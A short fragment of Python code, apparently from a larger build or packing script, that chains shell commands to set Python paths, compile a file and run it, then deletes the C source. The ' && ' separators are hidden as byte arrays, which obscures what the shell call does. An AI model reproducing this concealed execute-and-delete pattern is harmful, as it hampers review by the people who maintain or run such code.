os.makedirs(os.path.dirname(EXECUTE_FILE), exist_ok=True)
os.system(EXPORT_PYTHONHOME+bytes([32, 38, 38, 32]).decode()+EXPORT_PYTHON_EXECUTABLE+bytes([32, 38, 38, 32]).decode()+COMPILE_FILE+bytes([32, 38, 38, 32]).decode()+RUN)

os.remove(C_FILE)
